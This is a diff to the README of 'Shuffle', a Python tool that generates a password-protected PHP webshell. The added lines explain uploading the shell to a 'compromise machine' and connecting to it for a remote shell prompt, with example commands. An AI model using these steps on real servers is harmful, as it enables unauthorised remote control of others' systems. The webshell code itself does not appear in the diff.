@@ -1,7 +1,9 @@
 ![Shuffle Logo](https://raw.githubusercontent.com/matiasmenares/shuffle/master/extra/logo.png)
+
 [![Code Climate](https://codeclimate.com/github/matiasmenares/Shuffle/badges/gpa.svg)](https://codeclimate.com/github/matiasmenares/Shuffle)
+
 ### Version
-0.1 (Beta)s
+0.1 (Beta)
 ### Installation
 
 Only you need is Python 2.7
@@ -21,7 +23,24 @@ To create a webshell run:
 ```sh
 $ python shuffle.py -g webshell.php -p 123
 ```
+And Webshell generate in shuffle folder.
+```sh
+~/shuffle/webshell.php
+```
+### Connecting
+When you upload shell to compromise machine only you need is run shell with:
 
+```sh
+$ python shuffle.py -u http://localhost/webshell.php -p 123
+```
+
+And wait to establish connection...
+
+```sh
+#> Conecction Established, Enjoy!
+
+localhost@apache[~]$>
+```
 License
 ----
 
